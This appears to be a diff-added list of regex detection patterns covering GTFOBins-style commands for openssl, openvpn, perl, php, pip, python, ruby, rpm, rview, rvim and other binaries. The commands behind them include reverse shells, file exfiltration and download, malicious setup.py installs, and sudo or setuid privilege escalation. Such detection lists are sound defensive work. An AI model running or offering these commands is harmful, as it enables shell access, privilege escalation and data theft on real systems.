+mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| openssl s_client -quiet -connect [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ > /tmp/s\; rm /tmp/s|mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| openssl s_client -quiet -connect \$[A-Z_]+:\$[A-Z_]+ > /tmp/s\; rm /tmp/s|mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| openssl s_client -quiet -connect http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ > /tmp/s\; rm /tmp/s
+openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes
+openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345 > [\w\-_\/]+
+openssl s_client -quiet -connect [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ < "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|openssl s_client -quiet -connect \$[A-Z_]+:\$[A-Z_]+ < "\$[A-Z_]+"|openssl s_client -quiet -connect http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ < "http\w:[\w\.\/\?\=\&\%]+"
+openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes
+openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345 < [\w\-_\/]+
+openssl s_client -quiet -connect [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ > "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|openssl s_client -quiet -connect \$[A-Z_]+:\$[A-Z_]+ > "\$[A-Z_]+"|openssl s_client -quiet -connect http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ > "http\w:[\w\.\/\?\=\&\%]+"
+openssl enc -in "http\w:[\w\.\/\?\=\&\%]+" -out "http\w:[\w\.\/\?\=\&\%]+"|openssl enc -in "\$[A-Z_]+" -out "\$[A-Z_]+"|openssl enc -in "[ a-z0-9A-Z\.\-\/\'\"_\@]+" -out "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+openssl enc -in "\$[A-Z_]+"|openssl enc -in "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|openssl enc -in "http\w:[\w\.\/\?\=\&\%]+"
+openssl req -engine \./lib\.so
+openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes
+openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345
+mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| \./openssl s_client -quiet -connect http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ > /tmp/s\; rm /tmp/s|mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| \./openssl s_client -quiet -connect \$[A-Z_]+:\$[A-Z_]+ > /tmp/s\; rm /tmp/s|mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| \./openssl s_client -quiet -connect [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ > /tmp/s\; rm /tmp/s
+openssl req -x509 -newkey rsa:4096 -keyout key\.pem -out cert\.pem -days 365 -nodes
+openssl s_server -quiet -key key\.pem -cert cert\.pem -port 12345
+mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| sudo openssl s_client -quiet -connect http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+ > /tmp/s\; rm /tmp/s|mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| sudo openssl s_client -quiet -connect \$[A-Z_]+:\$[A-Z_]+ > /tmp/s\; rm /tmp/s|mkfifo /tmp/s\; /bin/sh -i < /tmp/s 2>&1 \| sudo openssl s_client -quiet -connect [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+ > /tmp/s\; rm /tmp/s
+openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+openvpn --config "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|openvpn --config "\$[A-Z_]+"|openvpn --config "http\w:[\w\.\/\?\=\&\%]+"
+\./openvpn --dev null --script-security 2 --up '/bin/sh -p -c "sh -p"'
+\./openvpn --config "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./openvpn --config "http\w:[\w\.\/\?\=\&\%]+"|\./openvpn --config "\$[A-Z_]+"
+sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'
+sudo openvpn --config "http\w:[\w\.\/\?\=\&\%]+"|sudo openvpn --config "\$[A-Z_]+"|sudo openvpn --config "[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+sudo openvt -- sh -c "\$[A-Z_]+ >\$[A-Z_]+ 2>&1"cat \$[A-Z_]+|sudo openvt -- sh -c "[ a-z0-9A-Z\.\-\/\'\"_\@]+ >[ a-z0-9A-Z\.\-\/\'\"_\@]+ 2>&1"cat [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo openvt -- sh -c "http\w:[\w\.\/\?\=\&\%]+ >http\w:[\w\.\/\?\=\&\%]+ 2>&1"cat http\w:[\w\.\/\?\=\&\%]+
+sudo paste [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo paste http\w:[\w\.\/\?\=\&\%]+|sudo paste \$[A-Z_]+
+echo 'import os\; os\.system\("/bin/sh"\)' > \$[A-Z_]+|echo 'import os\; os\.system\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+|echo 'import os\; os\.system\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+
+echo 'import os\; os\.system\("/bin/sh"\)' > \$[A-Z_]+|echo 'import os\; os\.system\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+|echo 'import os\; os\.system\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo pdb [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo pdb \$[A-Z_]+|sudo pdb http\w:[\w\.\/\?\=\&\%]+
+perl -e 'exec "/bin/sh"\;'
+perl -e 'use Socket\;\$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\$[A-Z_]+{RHOST}"\;\$[\w\-_]+=\$[A-Z_]+{RPORT}\;socket\(S\,PF_INET\,SOCK_STREAM\,getprotobyname\("tcp"\)\)\;if\(connect\(S\,sockaddr_in\(\$p\,inet_aton\(\$i\)\)\)\){open\(STDIN\,">&S"\)\;open\(STDOUT\,">&S"\)\;open\(STDERR\,">&S"\)\;exec\("/bin/sh -i"\)\;}\;'|perl -e 'use Socket\;\$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+[ a-z0-9A-Z\.\-\/\'\"_\@]+{RHOST}"\;\$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+{RPORT}\;socket\(S\,PF_INET\,SOCK_STREAM\,getprotobyname\("tcp"\)\)\;if\(connect\(S\,sockaddr_in\(\$p\,inet_aton\(\$i\)\)\)\){open\(STDIN\,">&S"\)\;open\(STDOUT\,">&S"\)\;open\(STDERR\,">&S"\)\;exec\("/bin/sh -i"\)\;}\;'|perl -e 'use Socket\;\$[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+http\w:[\w\.\/\?\=\&\%]+{RHOST}"\;\$[\w\-_]+=http\w:[\w\.\/\?\=\&\%]+{RPORT}\;socket\(S\,PF_INET\,SOCK_STREAM\,getprotobyname\("tcp"\)\)\;if\(connect\(S\,sockaddr_in\(\$p\,inet_aton\(\$i\)\)\)\){open\(STDIN\,">&S"\)\;open\(STDOUT\,">&S"\)\;open\(STDERR\,">&S"\)\;exec\("/bin/sh -i"\)\;}\;'
+\./perl -e 'exec "/bin/sh"\;'
+sudo perl -e 'exec "/bin/sh"\;'
+sudo setcap cap_setuid\+ep perl
+\./perl -e 'use POSIX qw\(setuid\)\; POSIX::setuid\(0\)\; exec "/bin/sh"\;'
+sudo pg /etc/profile
+php -r 'system\(getenv\("CMD"\)\)\;'
+php -r 'passthru\(getenv\("CMD"\)\)\;'
+php -r 'print\(shell_exec\(getenv\("CMD"\)\)\)\;'
+php -r '\$p =[ a-z0-9A-Z\.\-\/\'\"_\@]+\(array\("pipe"\,"r"\)\,array\("pipe"\,"w"\)\,array\("pipe"\, "w"\)\)\;\$h =[ a-z0-9A-Z\.\-\/\'\"_\@]+\(getenv\("CMD"\)\, \$p\, \$pipes\)\;if\(\$h&&\$pipes\){while\(!feof\(\$pipes1\)\) echo\(fread\(\$pipes1\,4096\)\)\;while\(!feof\(\$pipes2\)\) echo\(fread\(\$pipes2\,4096\)\)\;fclose\(\$pipes0\)\;fclose\(\$pipes1\)\;fclose\(\$pipes2\)\;proc_close\(\$h\)\;}'
+php -S [ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+|php -S http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+|php -S \$[A-Z_]+:\$[A-Z_]+
+\./php -r "pcntl_exec\('/bin/sh'\, '-p'\)\;"
+sudo php -r "system\('\$[A-Z_]+'\)\;"|sudo php -r "system\('[ a-z0-9A-Z\.\-\/\'\"_\@]+'\)\;"|sudo php -r "system\('http\w:[\w\.\/\?\=\&\%]+'\)\;"
+sudo setcap cap_setuid\+ep php
+\./php -r "posix_setuid\(0\)\; system\('http\w:[\w\.\/\?\=\&\%]+'\)\;"|\./php -r "posix_setuid\(0\)\; system\('[ a-z0-9A-Z\.\-\/\'\"_\@]+'\)\;"|\./php -r "posix_setuid\(0\)\; system\('\$[A-Z_]+'\)\;"
+sh X sh X
+sudo pic -U
+sh X sh X
+sh X sh X
+reset\; sh 1>&0 2>&0
+pico -s /bin/sh
+reset\; sh 1>&0 2>&0
+\./pico -s /bin/sh
+echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > http\w:[\w\.\/\?\=\&\%]+/setup\.py|echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > \$[A-Z_]+/setup\.py|echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+os\.dup2\(s\.fileno\(\)\,fd\) for fd in \(0\,1\,2\)
+pty\.spawn\("/bin/sh"\)' > \$[A-Z_]+/setup\.py|pty\.spawn\("/bin/sh"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|pty\.spawn\("/bin/sh"\)' > http\w:[\w\.\/\?\=\&\%]+/setup\.py
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as u
+else: import urllib as u\, urllib2 as r
+r\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)' > \$[A-Z_]+/setup\.py|r\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|r\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)' > http\w:[\w\.\/\?\=\&\%]+/setup\.py
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as ss
+else: import SimpleHTTPServer as s\, SocketServer as ss
+ss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|ss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)' > http\w:[\w\.\/\?\=\&\%]+/setup\.py|ss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)' > \$[A-Z_]+/setup\.py
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+if sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r
+else: import urllib as r
+r\.urlretrieve\(e"URL"\, e"LFILE"\)' > \$[A-Z_]+/setup\.py|r\.urlretrieve\(e"URL"\, e"LFILE"\)' > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py|r\.urlretrieve\(e"URL"\, e"LFILE"\)' > http\w:[\w\.\/\?\=\&\%]+/setup\.py
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+pip install http\w:[\w\.\/\?\=\&\%]+|pip install \$[A-Z_]+|pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+
+echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > http\w:[\w\.\/\?\=\&\%]+/setup\.py|echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > \$[A-Z_]+/setup\.py|echo "import os\; os\.execl\('/bin/sh'\, 'sh'\, '-c'\, 'sh <\$\(tty\) >\$\(tty\) 2>\$\(tty\)'\)" > [ a-z0-9A-Z\.\-\/\'\"_\@]+/setup\.py
+sudo pip install [ a-z0-9A-Z\.\-\/\'\"_\@]+|sudo pip install \$[A-Z_]+|sudo pip install http\w:[\w\.\/\?\=\&\%]+
+sudo pkexec /bin/sh
+pr -T http\w:[\w\.\/\?\=\&\%]+|pr -T [ a-z0-9A-Z\.\-\/\'\"_\@]+|pr -T \$[A-Z_]+
+pr -T http\w:[\w\.\/\?\=\&\%]+|pr -T [ a-z0-9A-Z\.\-\/\'\"_\@]+|pr -T \$[A-Z_]+
+pr -T http\w:[\w\.\/\?\=\&\%]+|pr -T [ a-z0-9A-Z\.\-\/\'\"_\@]+|pr -T \$[A-Z_]+
+puppet apply -e "exec { '/bin/sh -c /"exec sh -i <\$\(tty\) >\$\(tty\) 2>\$\(tty\)/"': }"
+puppet filebucket -l diff /dev/null [ a-z0-9A-Z\.\-\/\'\"_\@]+|puppet filebucket -l diff /dev/null \$[A-Z_]+|puppet filebucket -l diff /dev/null http\w:[\w\.\/\?\=\&\%]+
+sudo puppet apply -e "exec { '/bin/sh -c /"exec sh -i <\$\(tty\) >\$\(tty\) 2>\$\(tty\)/"': }"
+python -c 'import os\; os\.system\("/bin/sh"\)'
+python -c 'import sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)'
+python -c 'import sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)'
+python -c 'import sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e"URL"\, e"LFILE"\)'
+python -c 'open\("[\w\-_\/]+"\,"w\+"\)\.write\("DATA"\)'
+python -c 'print\(open\("[\w\-_\/]+"\)\.read\(\)\)'
+python -c 'from ctypes import cdll\; cdll\.LoadLibrary\("lib\.so"\)'
+\./python -c 'import os\; os\.execl\("/bin/sh"\, "sh"\, "-p"\)'
+sudo python -c 'import os\; os\.system\("/bin/sh"\)'
+sudo setcap cap_setuid\+ep python
+\./python -c 'import os\; os\.setuid\(0\)\; os\.system\("/bin/sh"\)'
+rake -p '`/bin/sh 1>&0`'
+sudo rake -p '`/bin/sh 1>&0`'
+\./rake -p '`/bin/sh 1>&0`'
+readelf -a @[ a-z0-9A-Z\.\-\/\'\"_\@]+|readelf -a @http\w:[\w\.\/\?\=\&\%]+|readelf -a @\$[A-Z_]+
+\./readelf -a @[ a-z0-9A-Z\.\-\/\'\"_\@]+|\./readelf -a @http\w:[\w\.\/\?\=\&\%]+|\./readelf -a @\$[A-Z_]+
+sudo readelf -a @http\w:[\w\.\/\?\=\&\%]+|sudo readelf -a @\$[A-Z_]+|sudo readelf -a @[ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo red [\w\-_\/]+
+sudo redcarpet "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo redcarpet "\$[A-Z_]+"|sudo redcarpet "http\w:[\w\.\/\?\=\&\%]+"
+\./rest-server --listen ":http\w:[\w\.\/\?\=\&\%]+"|\./rest-server --listen ":\$[A-Z_]+"|\./rest-server --listen ":[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+restic init -r "rest:http://localhost:http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+"|restic init -r "rest:http://localhost:\$[A-Z_]+/\$[A-Z_]+"|restic init -r "rest:http://localhost:[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+"
+restic restore -r "/tmp/restic/[ a-z0-9A-Z\.\-\/\'\"_\@]+" latest --target \.|restic restore -r "/tmp/restic/http\w:[\w\.\/\?\=\&\%]+" latest --target \.|restic restore -r "/tmp/restic/\$[A-Z_]+" latest --target \.
+restic backup -r "rest:http://[ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+" "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|restic backup -r "rest:http://http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+" "http\w:[\w\.\/\?\=\&\%]+"|restic backup -r "rest:http://\$[A-Z_]+:\$[A-Z_]+/\$[A-Z_]+" "\$[A-Z_]+"
+\./restic backup -r "rest:http://[ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+" "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|\./restic backup -r "rest:http://\$[A-Z_]+:\$[A-Z_]+/\$[A-Z_]+" "\$[A-Z_]+"|\./restic backup -r "rest:http://http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+" "http\w:[\w\.\/\?\=\&\%]+"
+sudo restic backup -r "rest:http://http\w:[\w\.\/\?\=\&\%]+:http\w:[\w\.\/\?\=\&\%]+/http\w:[\w\.\/\?\=\&\%]+" "http\w:[\w\.\/\?\=\&\%]+"|sudo restic backup -r "rest:http://[ a-z0-9A-Z\.\-\/\'\"_\@]+:[ a-z0-9A-Z\.\-\/\'\"_\@]+/[ a-z0-9A-Z\.\-\/\'\"_\@]+" "[ a-z0-9A-Z\.\-\/\'\"_\@]+"|sudo restic backup -r "rest:http://\$[A-Z_]+:\$[A-Z_]+/\$[A-Z_]+" "\$[A-Z_]+"
+rev http\w:[\w\.\/\?\=\&\%]+ \| rev|rev [ a-z0-9A-Z\.\-\/\'\"_\@]+ \| rev|rev \$[A-Z_]+ \| rev
+\./rev \$[A-Z_]+ \| rev|\./rev [ a-z0-9A-Z\.\-\/\'\"_\@]+ \| rev|\./rev http\w:[\w\.\/\?\=\&\%]+ \| rev
+sudo rev \$[A-Z_]+ \| rev|sudo rev [ a-z0-9A-Z\.\-\/\'\"_\@]+ \| rev|sudo rev http\w:[\w\.\/\?\=\&\%]+ \| rev
+rlogin -l "\$\(cat [ a-z0-9A-Z\.\-\/\'\"_\@]+\)" -p [ a-z0-9A-Z\.\-\/\'\"_\@]+ [ a-z0-9A-Z\.\-\/\'\"_\@]+|rlogin -l "\$\(cat http\w:[\w\.\/\?\=\&\%]+\)" -p http\w:[\w\.\/\?\=\&\%]+ http\w:[\w\.\/\?\=\&\%]+|rlogin -l "\$\(cat \$[A-Z_]+\)" -p \$[A-Z_]+ \$[A-Z_]+
+rlwrap -l "http\w:[\w\.\/\?\=\&\%]+" echo DATA|rlwrap -l "\$[A-Z_]+" echo DATA|rlwrap -l "[ a-z0-9A-Z\.\-\/\'\"_\@]+" echo DATA
+\./rlwrap -H /dev/null /bin/sh -p
+sudo rlwrap /bin/sh
+rpm --eval '%{lua:os\.execute\("/bin/sh"\)}'
+sudo rpm --eval '%{lua:os\.execute\("/bin/sh"\)}'
+fpm -n x -s dir -t rpm -a all --before-install http\w:[\w\.\/\?\=\&\%]+/x\.sh http\w:[\w\.\/\?\=\&\%]+|fpm -n x -s dir -t rpm -a all --before-install \$[A-Z_]+/x\.sh \$[A-Z_]+|fpm -n x -s dir -t rpm -a all --before-install [ a-z0-9A-Z\.\-\/\'\"_\@]+/x\.sh [ a-z0-9A-Z\.\-\/\'\"_\@]+
+sudo rpm -ivh x-1\.0-1\.noarch\.rpm
+\./rpm --eval '%{lua:os\.execute\("/bin/sh"\)}'
+rpmquery --eval '%{lua:posix\.exec\("/bin/sh"\)}'
+sudo rpmquery --eval '%{lua:posix\.exec\("/bin/sh"\)}'
+\./rpmquery --eval '%{lua:os\.execute\("/bin/sh"\)}'
+rsync -e 'sh -c "sh 0<&2 1>&2"' 127\.0\.0\.1:/dev/null
+\./rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127\.0\.0\.1:/dev/null
+sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127\.0\.0\.1:/dev/null
+ruby -e 'exec "/bin/sh"'
+ruby -rsocket -e 'exit if fork\;[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.new\(ENV"RHOST"\,ENV"RPORT"\)\;while\([\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.gets\)\;IO\.popen\(cmd\,"r"\){\|io\|c\.print io\.read}end'
+ruby -run -e httpd \. -p \$[A-Z_]+|ruby -run -e httpd \. -p http\w:[\w\.\/\?\=\&\%]+|ruby -run -e httpd \. -p [ a-z0-9A-Z\.\-\/\'\"_\@]+
+ruby -e 'File\.open\("[\w\-_\/]+"\, "w\+"\) { \|f\| f\.write\("DATA"\) }'
+ruby -e 'puts File\.read\("[\w\-_\/]+"\)'
+ruby -e 'require "fiddle"\; Fiddle\.dlopen\("lib\.so"\)'
+sudo ruby -e 'exec "/bin/sh"'
+sudo setcap cap_setuid\+ep ruby
+\./ruby -e 'Process::Sys\.setuid\(0\)\; exec "/bin/sh"'
+run-parts --new-session --regex '\^sh\$' /bin
+sudo run-parts --new-session --regex '\^sh\$' /bin
+rview -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+rview -c ':lua os\.execute\("reset\; exec sh"\)'
+rview -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\; local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'
+rview -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;c:send\(b\)\;  end\;c:close\(\)\;f:close\(\)\;'
+rview -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as r\, urllib\.parse as uelse: import urllib as u\, urllib2 as rr\.urlopen\(e"URL"\, bytes\(u\.urlencode\({"d":open\(e"LFILE"\)\.read\(\)}\)\.encode\(\)\)\)vim\.command\(":q!"\)'
+rview -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import http\.server as s\, socketserver as sselse: import SimpleHTTPServer as s\, SocketServer as ssss\.TCPServer\(\(""\, int\(e"LPORT"\)\)\, s\.SimpleHTTPRequestHandler\)\.serve_forever\(\)vim\.command\(":q!"\)'
+rview -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, 'rb'\)  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:read\("\*a"\)  io\.close\(f\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  t:send\(d\)\;  t:close\(\)\;'
+rview -c ':py import vim\,sys\; from os import environ as eif sys\.version_info\.major ==[ a-z0-9A-Z\.\-\/\'\"_\@]+: import urllib\.request as relse: import urllib as rr\.urlretrieve\(e"URL"\, e"LFILE"\)vim\.command\(":q!"\)'
+rview -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(k\.bind\("\*"\,os\.getenv\("LPORT"\)\)\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:accept\(\)\;  local d\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\("\*a"\)\;  c:close\(\)\;  local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\.open\(os\.getenv\("LFILE"\)\, "wb"\)\;  f:write\(d\)\;  io\.close\(f\)\;'
+rview -c ':py import vim\; from ctypes import cdll\; cdll\.LoadLibrary\("lib\.so"\)\; vim\.command\(":q!"\)'
+\./rview -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-pc"\, "reset\; exec sh -p"\)'
+sudo rview -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+sudo rview -c ':lua os\.execute\("reset\; exec sh"\)'
+sudo setcap cap_setuid\+ep rview
+\./rview -c ':py import os\; os\.setuid\(0\)\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+\./rview -c ':lua os\.execute\("reset\; exec sh"\)'
+rvim -c ':py import os\; os\.execl\("/bin/sh"\, "sh"\, "-c"\, "reset\; exec sh"\)'
+rvim -c ':lua os\.execute\("reset\; exec sh"\)'
+rvim -c ':lua local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\("socket"\)\; local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(s\.tcp\(\)\)\;  t:connect\(os\.getenv\("RHOST"\)\,os\.getenv\("RPORT"\)\)\;  while true do    local r\,[\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+:receive\(\)\;local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(io\.popen\(r\,"r"\)\)\;    local [\w\-_]+=[ a-z0-9A-Z\.\-\/\'\"_\@]+\(f:read\("\*a"\)\)\;t:send\(b\)\;  end\;  f:close\(\)\;t:close\(\)\;'
